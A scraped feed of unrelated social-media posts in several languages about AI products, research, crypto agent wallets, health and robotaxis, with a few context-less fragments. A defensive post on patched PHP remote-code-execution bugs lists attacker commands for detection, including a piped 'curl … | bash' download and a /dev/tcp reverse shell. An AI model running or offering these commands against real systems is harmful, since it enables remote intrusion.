Notebooklm صار اقوى 🔥



 صار يتحول من “أداة تلخص ملفاتك” إلى “وكيل بحث” يشتغل داخل ملفاتك.



يعني قبل كان NotebookLM غالبًا: يرفع له PDF / مقالات / ملاحظات → تسأله → يجاوبك من المصادر.



الآن الترقية تقول إنه صار أقوى في:



1. Agentic chat

يعني المحادثة مو بس سؤال وجواب. يقدر يشتغل بخطوات: يبحث داخل مستنداتك، يربط المعلومات، يطلع نتيجة منظمة، ويكمل المهمة كأنه مساعد بحث.



2. Advanced reasoning

صار أفضل في المسائل المعقدة: مقارنة، تحليل، تلخيص عميق، استخراج أفكار، بناء حجج، وربط مصادر كثيرة.



3. New output formats

Audio Overview، Mind Map، Flashcards، Infographics، Tables.

 وبعض التغطيات ذكرت أن التحديثات الجديدة توسع المخرجات إلى ملفات مثل PDF وExcel وPowerPoint وCSV ورسومات/صور. 



4. Searching your docs

: “Searching your docs...”

يعني مو بس يقرأ الملف الحالي، بل يبحث داخل مصادر النوتبوك كلها ويجمع لك الجواب منها.



الخلاصة القوية:



NotebookLM صار أقرب إلى Research Agent مبني على مستنداتك.

مو مجرد summarizer.



لو عندك كتب، عقود، تقارير، ملفات مشروع، محاضرات، أو ملاحظات — تقدر تخليه يبني لك: دراسة، ملخص تنفيذي، جدول مقارنة، mind map، flashcards، عرض تقديمي، أو تحليل من مصادر محددة.

اسمه Beacon، مفتوح المصدر، وتجاوز 2,000 نجمة على GitHub.

بشكل افتراضي، بياناتك تبقى على جهازك، وما تُرفع إلى السحابة إلا بموافقتك.

أنت أنجزت المهمة مرة، والحين وكيلك يتعلّم منها عشان يستفيد منها مستقبلًا.

You were told Bittensor is a token printing machine with no real customers.



So explain why 91% of one subnet's GPUs are rented out right now.



The subnet is Lium (SN51), a GPU rental marketplace running on Bittensor ($TAO). Hardware owners list their machines, and anyone can rent high end NVIDIA GPUs from them.



Here is what the team reported for the 30 days to early October:



$1.40M in GPU spend, up 45%



17,497 rentals, up 106%



1,379 paying customers, up 16%



Now the part almost nobody is talking about.



Roughly 68% of those rentals were launched by code and AI agents, not humans clicking buttons. Machines are already shopping for compute on a decentralized network.



The math you can reuse on any subnet:



$1.40M a month × 12 ≈ $16.8M in annualized spend



$1.40M ÷ 1,379 customers ≈ $1,015 per customer per month



91% utilization means supply is the bottleneck, not demand



That last line is the signal to watch. When a marketplace runs out of GPUs before it runs out of buyers, the next question is how fast new providers arrive.



Providers grew about 15% over the same 30 days.



The honest caveat: these are team reported numbers, and $16.8M a year is tiny next to the hyperscalers. Anyone pretending otherwise is selling you something.



But tiny and paid beats huge and imaginary.



Emissions can fake activity. They cannot fake a customer paying the invoice.

It also runs on one 80GB GPU, so a hospital could run it in-house without sending patient DNA anywhere. It isn't clinically validated yet. I think open models are about to make genetics research dramatically cheaper.

Your IDE already knows your codebase. What happens when coding agents can use that knowledge too?



We tested it with Netflix using Claude Code and Codex. One finding stood out: the strongest models gained the most from IntelliJ IDEA’s code intelligence.


Kirill Skrygan (@kskrygan)



We connected IntelliJ IDEA’s code intelligence to Claude Code and Codex, then tested the setup with Netflix.



The first public results are out.



Typical efficiency gains: 20–30%.

Best code-navigation case: ~65%.



These results come from two real codebases. The efficiency metric averages token savings and time savings.



Correctness stayed stable or improved.



Here’s what we actually built.



The code engine behind IntelliJ IDEA ran headlessly, giving agents access to its capabilities through a CLI backed by a daemon.



LSP alone wasn’t sufficient.



Agents needed a convenient way to invoke the tools. The backend also needed to stay running and keep the project index warm between calls.



The idea is straightforward.



An IDE has already mapped the structure of your code and its dependencies — including what’s inside compiled libraries.



An agent can use that knowledge instead of spending time and tokens reconstructing it.



But the most interesting finding was which models benefited most.



The strongest models saw the biggest gains.



Especially at higher reasoning effort.



In these experiments, more capable models were also better at taking advantage of code intelligence.



My takeaway: better models and better tools aren’t competing bets.



You don’t have to choose between investing in model intelligence and giving agents better access to your codebase.



The two can reinforce each other.



Huge thanks to @pbakker and the Netflix team for working with us on this!

Leila Turner-Scott recently testified about the death of her 19-year-old son, Sam Nelson.



Her family alleges that Sam consulted ChatGPT about combining substances before his fatal accidental overdose, and that the system provided dangerously reassuring guidance.



OpenAI has called the situation heartbreaking. It says the conversations occurred on an earlier version of ChatGPT and that safeguards have since been strengthened.



The legal questions will be decided through the courts. But the design question already demands our attention.



What should happen when an AI detects a pattern of escalating risk?



A warning buried inside a helpful answer is not enough.



This is where AI needs a Trust Architecture:



→ Detect high-risk patterns across the conversation  

→ Stop optimizing for helpfulness when safety is uncertain  

→ Refuse to provide actionable instructions  

→ Direct the person toward qualified human support  

→ Escalate when the potential consequences are irreversible  



I have spent years exploring how AI can elevate humanity. Stories like Sam’s reinforce why that ambition must include the courage to limit what AI is allowed to do.



The most human AI is not the one that always keeps the conversation going.



Sometimes, it is the one that knows the conversation should stop.



How should AI companies be held accountable when their systems earn human trust?

Sharing new post-training research on self-distillation + RL (JOLT), done together with @NVIDIAAI. 



In self-distillation, the same model performs the role of both a teacher and a student. The teacher gets extra information that the student doesn't, and the student learns from feedback provided by the teacher. However, the teacher could still use shortcuts in ways the student has no way to follow.



Our proposed approach, JOLT, trains the teacher as well, to learn from rewards on its own attempts, while penalizing any drift that's far off from what the student model would do. JOLT+ further supplements JOLT by providing the student model outcome-based rewards in addition to the teacher supervision signals.



On the MATH benchmark, we found that JOLT matches GRPO with 6.5x fewer training tokens, while JOLT+ convincingly beats GRPO across math, coding, terminal tasks, and tool use benchmarks.

Two critical PHP RCEs are patched: CVE-2026-109618 and CVE-2026-109619, both CVSS 9.2.

• Fixed in 8.5.12, 8.4.27, 8.3.36, and 8.2.35.



You can still focus on detection coverage today.



Security Labs writeup (coverage + guidance): elastic.co/security-labs/thr…



Most PHP RCEs converge on the same outcome, whatever the bug: a web server process (php-fpm, php-cgi, apache2, httpd) doing something a request-serving daemon almost never does legitimately.



• a shell to confirm access: id, whoami, uname -a

• a second stage pulled in: curl http://... | bash

• a reverse shell: bash -i >& /dev/tcp//

• a webshell written into the web root



The bug class is public now: out-of-memory corruption, and stale state reused by the same worker. The behavior is what you detect.



We recently ran a different PHP RCE end-to-end (wp2shell): apache2 spawning dash to run id; whoami; hostname fired the exact rules that we suspect to catch php2shell. Payload Execution by Web Server kills the shell on the endpoint.



The Suspicious/Unusual Command, Child, and File Creation via Web Server rules stack on top.



(PHP did confirm partial php.ini mitigations. session.upload_progress.enabled=0 blocks the confirmed session paths only. Patch is still the fix.)



Patch to 8.5.12, 8.4.27, 8.3.36, or 8.2.35. Verify that the stack is enabled now.

还发了一条帖子讲这个ID的由来：nitterk.kareem.one/yijiangren/status/2112…



先讲一下怎么领取自己的 Agent ID



1.首先进入APP 点击顶部的钱包 然后点击活动banner

2.输入自己喜欢的域名

3.充值gas 一点BNB就好 建议提前在账户准备好

4.上链领取

5.创建成功



但我发现，很多人领完了自己的 Agent ID，可能还不知道接下来能做什么。

简单说，Agent ID 是你的 AI 身份标识，真正负责链上操作的，是背后的 Agentic Wallet。



过去，我们想完成一笔链上交易，需要打开钱包、选择网络、填写地址、设置参数，再一步步确认。



现在，你可以直接用自然语言告诉 AI 你想做什么。



比如

「查一下我的钱包里还有多少 USDT。」

「用 10 USDT 兑换 BNB，先给我报价，不要执行。」

「当 BNB 跌到指定价格时，帮我挂一个限价单。」



从查询余额、转账、兑换，到限价单和部分 DeFi 操作，都可以通过对话完成。



那么，我们怎么快速上手？



如果你已经通过 Agent ID 活动完成领取，可以直接尝试 Binance AI Pro。



第一步，点击 ai.binance.com ，进入网站，打开 Binance AI Pro，在对话框输入：「登录 Binance Agentic Wallet」



第二步，先从最简单的操作开始，查余额

对话框输入："查一下我的 Agentic Wallet 余额"

返回的持仓表按 USD 价值从大到小排列，包含代币 / 链、余额、USD 价值与合约地址



第三步，转账 通过域名或者地址

打个比方："给 metamental.ai 转 1 USDT"

但是需要保证收款地址在钱包的地址簿上，否则会被拒绝交易

添加路径：Binance App → 钱包 → 设置 → 地址簿



第四步 Swap

也就是说，我们可以直接通过自然语言让 Agent 执行交易

在对话框输入："把 1 USDT 换成 BNB"

Agent 会先取报价并展示明细 ——支付金额、预计到手、滑点、MEV 保护、Gas 等级

必须回复 confirm，兑换才会真正发出。

在确认之前，也可以要求改用不同的滑点或 Gas 设置。



第五步 查询新发射代币

在对话框输入："列出 Four.meme 在 BSC 上最新发射的 10 个代币"

Agent 会读取新发射数据源，返回它实际找到的内容 —— 名称、合约、上线时长、早期买入情况。



第六步  ；了解更多场景

web3.binance.com/zh-CN/dev-d…

This is significant because one of quantum computing's biggest limitations is not just computational power.



It is reliability.



Quantum systems are extremely sensitive to noise and errors. Making them fault-tolerant requires sophisticated error correction and substantial computing resources.



By using NVIDIA GH200 GPUs and advanced simulation technologies, researchers can investigate complex quantum architectures before building the physical hardware.



We are witnessing an important convergence of three technological infrastructures:



Artificial Intelligence and accelerated computing.

High-performance and exascale supercomputing.

Fault-tolerant quantum computing.



These technologies are increasingly becoming interconnected foundations of the next computing economy.



The implications could eventually extend across scientific discovery, materials research, pharmaceuticals, energy and advanced industrial systems.

It will depend on making quantum computation reliable, scalable and economically practical.

📢 Call for Participation: SemEval-2027 Task 6: Multilingual and Multimodal Culturally Grounded Spoken and Visual Question Answering



We are pleased to invite participation in MMCultureQA, a SemEval-2027 Shared Task on Multilingual and Multimodal Culturally Grounded Question Answering.



🎯 What is MMCultureQA?

The goal of this shared task is to evaluate whether multimodal systems can answer questions that require not only understanding an image, but also linguistic and cultural knowledge.



Given an image and a spoken or written question, systems must generate a short, open-ended textual answer. Questions cover culturally grounded topics such as food, places, customs, everyday objects, traditions, and social practices, where visual information alone may not be sufficient.



The shared task includes two main tasks:

🎧 Task 1: Spoken Visual Question Answering

Input: Image + spoken question

Output: Open-ended textual answer

📝 Task 2: Textual Visual Question Answering

Input: Image + written question

Output: Open-ended textual answer



Each task includes multiple language tracks, and participants may take part in one or multiple tracks.



🌍 Languages include: English, Modern Standard Arabic, Dialectal Arabic (Egyptian, Leventine), Bangla, Hindi, Amharic, Assamese, Gujarati, Italian, Marathi, Oromo, Somali, Sinhala, Nepali, Tigrinya, Urdu.



📂 Dataset

The MMCultureQA data builds on the EverydayMMQA framework, which enables the development of culturally grounded multimodal QA datasets across image, text, and speech modalities.



📅 Important Dates

Training data release: 23 September 2026

Evaluation starts: January 10, 2027

Evaluation ends: January 31, 2027

System description papers: February 2027 (tentative)

Trust is going to be a major challenge as AI agents begin handling more complex tasks and interacting with each other. When an agent completes a job, how can a client evaluate its reliability? How can previous performance be considered when choosing between different service providers? And how can the ecosystem move beyond promises to create a more transparent record of completed work?



@termix_ai approaches this challenge through the AACP ecosystem, where agent identity, reputation, staking, delivery verification, and dispute resolution are important parts of the broader architecture. The goal is to create a framework where interactions can be supported by more than a simple profile or description.



Through agent.family, users can explore an agent directory and examine information such as reputation scores, job counts, and available agent details. These signals can help people understand an agent’s profile, although reputation scores alone should not be treated as proof of quality or successful performance.



As the agent economy grows, trust mechanisms will matter just as much as the intelligence of the agents themselves. Reliable identity, meaningful performance history, and verifiable delivery can help create stronger foundations for agent-to-agent commerce.

Only about a quarter of human diseases have an approved therapy. By some estimates it's a few percent. Most of those treatments slow a disease rather than stop it.



Closing that gap is what the AI-cures-everything story promises. Build a system smart enough and the cures hidden in what we already know will fall out. I have worked at the intersection of machine learning and biology for three decades, and I believe #AI will eventually transform human health. The capabilities arriving now are extraordinary. But the promise rests on an assumption that is simply false: that we already understand human biology well enough for a clever enough reasoner to find the answers in it. We don't.



More than 90% of drugs entering clinical trials fail, a number that has barely moved in decades. In the large majority of those failures the molecule was engineered just fine. The mechanism it targeted was wrong. We are doing a pretty good job at manufacturing keys, but they are generally for the wrong locks. And because nobody wants to fail in the clinic, the industry has retreated to the locks it already trusts: 38 targets now have more than 50 programs against each of them, while the number of novel targets advanced per year fell from roughly 100 in 2015 to about 30 in 2024.



AI will not reason its way past this. Biology wasn't engineered. It is the product of billions of years of messy, stochastic evolution, and the variation that produced is too vast and too idiosyncratic to work out in the abstract. You have to measure it. Aimed at a biology this thinly sampled, AI will mostly help us generate failures faster.



I founded @insitro because getting to the right locks requires a different kind of system. We generate multimodal human and cellular data at scale, use machine learning to find causal drivers of disease, and test those hypotheses experimentally. Virtual Human™ is built for causal discovery; TherML™ turns what it finds into the right therapeutic intervention. It is working: first-in-class programs internally and with partners, three #ALS targets that Virtual Human™ identified and @bmsnews nominated, and additional collaborations with @EliLillyandCo and @GileadSciences .

Issue one is "Drug Discovery Has No Magic Wands," the first half of a two-part essay on the magical thinking currently running through our field and what I think it will actually take. After that you will hear from insitro's own scientists and engineers, people who work across computation and experiment because the problem requires both.



Getting this right is hard, and we do not have all of it worked out. I hope you will follow along and think it through with us.

Mirendil's mission is to solve Recursive Self-Improvement (RSI) and use it to democratize frontier AI development, ultimately accelerating science and technology. At Mirendil, when we think about RSI, we think holistically about the company as an intelligent entity that self-improves toward its goal. System Design: How would you build an AI agent orchestration platform?



Imagine asking 3 AI agents to complete one task:



→ Agent 1 writes the code.

→ Agent 2 reviews it.

→ Agent 3 runs tests before merging.



Sounds simple, right? 



The real challenge is coordinating everything reliably.



1. Orchestration Layer



- A central orchestrator assigns tasks, tracks workflow state, and coordinates agents.



2. Workflow Engine



- Represent dependencies as a DAG. 

- Code writing must finish before review starts, and tests run after approval. 

- Independent tasks can execute in parallel.



Each task follows a state machine:



"PENDING → READY → RUNNING → COMPLETED"



On failure:



"RUNNING → RETRY_WAIT → READY"



If retries are exhausted, the task moves to "FAILED".



Persist state transitions so workflows can recover after crashes. 



A task becomes "READY" only when its dependencies are satisfied.



3. Execution Queue



- Use Kafka or a durable job queue to distribute tasks to workers.

- Workers claim jobs, execute them, and report results. 

- Use idempotency keys to prevent duplicate processing.



4. Failure Handling



Failures are inevitable. Design for them.



- Transient errors: Retry with exponential backoff and jitter.

- Repeated failures: Move tasks to a dead-letter queue for investigation.

- Worker crashes: Use leases and heartbeats to detect abandoned tasks and safely reassign them.

- Model/API timeouts: Apply timeouts, retry limits, and circuit breakers.

- Partial failures: Persist completed outputs so successful agents don't need to rerun unnecessarily.

- Invalid agent output: Validate results before allowing dependent tasks to proceed.



Never assume a retry means the previous execution didn't happen. 



Use idempotency and durable checkpoints to avoid duplicate side effects.



5. Shared Context



- Store task instructions, agent outputs, code diffs, logs, and conversation history in shared storage. 

- Pass each agent only the context it needs.



6. Conflict Prevention



- Give coding agents isolated Git branches or worktrees. 

- Validate diffs, run tests, and merge only after conflict checks and required approvals.



7. Observability & Cost Control



- Track token usage, model costs, execution time, retries, and failure rates. 

- Set budgets and stop runaway workflows.



8. Pause, Resume & Cancel



Persist workflow state in PostgreSQL.



- Pause: Stop scheduling new tasks and let active workers reach safe checkpoints.

- Resume: Requeue eligible tasks.

- Cancel: Stop pending tasks and signal active workers to terminate safely.



Keep "FAILED" and "CANCELLED" separate: one means execution failed; the other means execution was intentionally stopped.



Architecture at a glance:



Developer → API → Orchestrator → Workflow Engine → Durable Queue → Agent Workers



Supporting services:



- PostgreSQL - workflow state and checkpoints

- Redis - caching and short-lived coordination

- Object storage - logs, artifacts, and code outputs

- Retry/DLQ mechanism - failed task recovery

- Observability - logs, metrics, traces, and cost tracking



The key principle: assume every component can fail, and make recovery part of the architecture.

Cheering for @_jasonwei and his team today! Not only because I know how passionate they are about AI for Health research, but also, at a personal level, growing up with a sibling who was never diagnosed, the actual impact of this acceleration in health research is so hopeful


Jason Wei (@_jasonwei)



In our health workstream at Meta we did a project where we wanted to see what research papers medical experts could write using a Muse Wonder coding scaffold that could access a database of 5M electronic health records we licensed from a vendor. The goal is that with 5M patients in this database, AI could do research to answer arbitrary questions like “did people who take statin have higher rates of diabetes later in life”? The thing we were betting on here is on what happens when you put human experts, a strong coding model, and access to data all together



We worked with a small group of medical experts to help them use this AI tool and the punchline is that they all found that this setup enabled a much faster pace of health research. They generated ten manuscripts in around two weeks, with one researcher (Paddy Ssentongo) generating three. Throughout the process, they collaborated with each other to review manuscripts and write skill files to help our coding scaffold improve at doing research. The medical experts liked how quickly they could test different hypotheses and choose the best ones to continue working on



Health research is pretty unique in that it is super important to be able to interpret noisy data and have taste to know which variables are important, which was still a significant value add from human researchers. Given that medicine is one of the oldest fields in human history and it is ultimately about humans, keeping a substantial human component in this type of research is probably important. In the near future I see AI primarily as a tool to facilitate human-led research. With the right scaffold I believe health researchers can be 10x or even 100x more productive using AI tools that have appropriate access to the wealth of data that the world has collected about human health



One way to see this work is through the broader lens of AI for science. You can think of science as two parts: (1) collecting raw data about the world, and (2) synthesizing that raw data into understanding. In this project we already had existing data about the world and we aimed to accelerate part (2) using AI. Eventually, I imagine a world where we have such great AI tools that the time to synthesize raw data into understanding is driven towards zero. In that world, science will be substantially faster and most of the work will be focused on collecting the right raw data via physical experiments



We did this in a pretty short amount of time (which was the point) and I think the future of scientific research will be more faster and more exciting than ever

AI will not automate radiologists like you think



We have been talking for years now about AI automating jobs. Radiology has been a prime target, with Geoff Hinton once claiming, “people should stop training radiologists now, it’s just completely obvious that within five years, deep learning is going to do better than radiologists”, which is funny since he said that in 2016. There is now more demand for radiologists than ever, so clearly things did not turn out the way many thought. Here I will make a prediction that while radiology will change in the coming decade, radiologists will not be automated away any time soon. I will use radiology as an example but I think these principles will broadly apply to any field where demand can be elastic and quality can scale with increased intelligence.



First of all, we have seen in the short history of language models that there is a “jagged edge of intelligence”, where AI excels at verifiable tasks with a lot of data but is underwhelming on less common tasks. One thing most AI researchers underestimate about radiology is that it is actually extremely multi-task. There are at least a hundred conditions that can be diagnosed from x-rays alone, and thousands using CT and MRI. AI will first master common and easy-to-see conditions and it will not be as good as experts at less-common diseases just because there is less data for that. This jagged edge will certainly improve over time but this means that AI will certainly be used as a triage tool at first, rather than full automation in one go. I would guess that this process from solid triage tool to full automation would take 3-5 years in the best case scenario, because training AI to get all the edge cases right will be bottlenecked by data collection of rare diseases, and also because radiology isn’t currently a focus for frontier labs.



Second, there will be elastic demand for radiology as it gets cheaper per unit. I think elastic demand (“Jevons paradox”) is the most underrated phenomenon when people think about AI automation. In software, it is obvious that I have way more demand than before because Claude Code makes it so easy. These days I ask Claude Code to build a custom three-thousand line html viewer to help me visualize every little RL run that I do. The same thing will happen in radiology. If there is essentially no cost or latency of interpreting an MRI, a physician can order many scans preemptively to better diagnose a case. So with AI tools, a radiologist might have to read only 20% of inbound scans, but there might be 5x more scans inbound. Many developing countries have fewer than one radiologist per million people and they will also want to send a lot of radiology to be interpreted.



Longer term, cheap and fast radiology interpretation will also drive incentives to build cheaper radiology scanners. If an MRI had essentially no latency for interpretation, medical devices companies will want to build much cheaper MRI machines that can be used more frequently, perhaps even in the middle of a surgery. AI will accelerate the development of scanning technology, too. If a full body MRI was only $100 dollars I would totally want to get one every month instead of every two years. I can imagine a world where people get 10 or 100x the number of scans they do today, largely for preventative care, if radiology were 10-100x cheaper.



Third, even if we did have a model that could outperform the world’s best radiologists today, that would not be the end of all work on radiology. Medicine is a field of change. We may develop new treatment protocols that require reading radiology images in a way that radiologists currently aren’t used to. New scanners may reveal diseases that we cannot currently diagnose today with radiology alone. Some radiologists will change their work from reading scans to doing frontier research to advance our understanding of radiology and translate new knowledge into updated models.



Moreover, I am sure that we will ask for more out of our AI models than ever before. With a good flywheel, we may one day train AI models that can use radiology images to predict disease probabilities far into the future. With good prediction algorithms, cancer may be detected months earlier than we can detect it now. Society will invest a lot into this research and this will contribute even more to increased demand for radiology and the best AI around it.



On top of all of this, the medical system is typically slower to adopt new technology and has more regulation compared to technology companies. There is legacy infrastructure and medical centers need to constantly support patients which makes it hard to integrate new technology. This is even more true in developing countries. Moreover data access tends to be limited due to HIPAA, deidentification, IRBs, etc. So I think radiologists will be in demand for a while.



While some worry about radiology being totally automated, I think there is a more exciting future for radiology than ever before—one where there is more demand and we ask for more predictive power from our intelligence. This is similar to how many of us feel that programming will thrive more than ever before despite drastic change in the field. More generally, any domain where demand can be elastic and quality can scale with increased intelligence will, like radiology, similarly flourish with the development of AI. This is certainly a more exciting and nuanced future than what Hinton described in 2016!



(Finally, to be fair to Hinton, he did acknowledge in a recent podcast that he was wrong and also agrees with the elastic demand argument.)

Waymo and Zoox first impressions



I use self driving on my Tesla all the time, but I finally got around to trying the commercial autonomous ride hailing services this week in Las Vegas.



The biggest issue by far is the very limited pickup and dropoff points, and only having a couple minutes to get to them resulted in a bit of a rush.



If you are going to have a small-integer number of locations, you should make it super-obvious where those locations are. Waymo included a picture, but it was a rather undistinguished parking garage image and it wasn’t clear which floor it was on. Being able to switch the map to an aerial photography view might be helpful in some cases. Pan-able 360 photos of the target points might also be helpful.



The first Zoox ride was flawless, but we had a lengthy walk to get to our actual destination.



The first Waymo ride was a little rougher. It felt more indecisive with steering, like Teslas did a couple years ago. This was still early-access in Vegas, so it is probably better in the active commercial markets.



The second Zoox ride had a small incident – there was another Zoox ahead of us at a stoplight (and a Waymo and another Zoox next to us!) that repeatedly tried to back up into our Zoox, to the point that ours actually honked at the one ahead of it a couple times. Eventually, after multiple light cycles, ours started to tentatively try to get around it, which left it partway into the next lane and distressingly close to a fast moving semi. The one ahead finally moved, and the ride continued normally.



Overall, the Zoox experience felt a bit more charming than the Waymo, with several nice little touches, but they both get the job done. I still need to try a Cybercab.
